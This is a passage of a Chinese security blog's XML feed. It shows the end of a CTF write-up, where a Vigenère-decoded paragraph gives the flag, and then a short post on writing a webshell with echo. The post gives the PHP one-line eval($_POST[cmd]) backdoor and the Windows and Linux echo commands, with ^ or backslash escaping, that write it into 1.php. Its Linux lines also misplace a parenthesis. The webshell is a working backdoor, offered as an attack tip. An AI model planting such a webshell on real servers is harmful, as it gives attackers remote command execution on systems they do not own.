class="line">http://68.168.134.3/vigener/</span><br></pre></td></tr></table></figure><p>解得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thestatekeylaboratoryofnetworkingandswitchingtechnologybelongstobeijinguniversityofpostsandtelecommunicationsthelaboratorywasopenedinnineteenninetytwoinnineteenninetyfivethelaboratorypassedacceptanceinspectionbogovernmentandanevaluationorganizedbyministryofscienceandtechnologyintwothousandandtwosincetwothousandandfourthelaboratoryhasbeenrenamedasthestatekeylaboratoryofnetworkingandswitchingtechnologybyministryofscienceandtechnologyflagisyouaresokindly</span><br></pre></td></tr></table></figure><p>这么一段英文，flag就是最后一句，flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are so kindly</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h1&gt;&lt;h3 id=&quot;1-、超简单&quot;&gt;&lt;a href=&quot;#1-、超简单&quot; class=&quot;headerlink&quot; title=&quot;1)、超简单&quot;&gt;&lt;/a&gt;1)、超简单&lt;/h3&gt;
    
    </summary>
    
    
      <category term="ctf相关" scheme="http://yoursite.com/tags/ctf%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>echo写马的小技巧</title>
    <link href="http://yoursite.com/2018/11/26/echo%E5%86%99%E9%A9%AC%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/"/>
    <id>http://yoursite.com/2018/11/26/echo写马的小技巧/</id>
    <published>2018-11-26T02:29:22.000Z</published>
    <updated>2018-11-26T03:18:20.710Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-首先给一个错误的写马方式"><a href="#0x00-首先给一个错误的写马方式" class="headerlink" title="0x00:首先给一个错误的写马方式"></a>0x00:首先给一个错误的写马方式</h2><a id="more"></a><h3 id="0x01-Windows"><a href="#0x01-Windows" class="headerlink" title="0x01:Windows"></a>0x01:Windows</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; &gt; 1.php</code></p><p><img src="/2018/11/26/echo写马的小技巧/errorma.png" alt=""></p><p>你会发现文件里面多了双引号.</p><h3 id="0x02-Linux"><a href="#0x02-Linux" class="headerlink" title="0x02:Linux"></a>0x02:Linux</h3><p><code>echo &quot;&lt;?php @eval($_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p><p><img src="/2018/11/26/echo写马的小技巧/errormalinux.png" alt=""></p><p>$_POST无故消失.</p><h2 id="0x10-正确的写马方式"><a href="#0x10-正确的写马方式" class="headerlink" title="0x10:正确的写马方式"></a>0x10:正确的写马方式</h2><h3 id="0x11-Windows"><a href="#0x11-Windows" class="headerlink" title="0x11:Windows"></a>0x11:Windows</h3><p><code>echo ^&lt;?php @eval($_POST[cmd]);?^&gt; &gt; 1.php</code></p><p>在尖括号前面加^这个符号.</p><p><img src="/2018/11/26/echo写马的小技巧/rightma.png" alt=""></p><h3 id="0x12-Linux"><a href="#0x12-Linux" class="headerlink" title="0x12:Linux"></a>0x12:Linux</h3><p><code>echo &quot;&lt;?php @eval(\$_POST[cmd];?)&gt;&quot; &gt; 1.php</code></p><p>在$符前加斜杠.</p><p><img src="/2018/11/26/echo写马的小技巧/rightmalinux.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-首先给一个错误的写马方式&quot;&gt;&lt;a href=&quot;#0x00-首先给一个错误的写马方式&quot; class=&quot;headerlink&quot; title=&quot;0x00:首先给一个错误的写马方式&quot;&gt;&lt;/a&gt;0x00:首先给一个错误的写马方式&lt;/h2&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
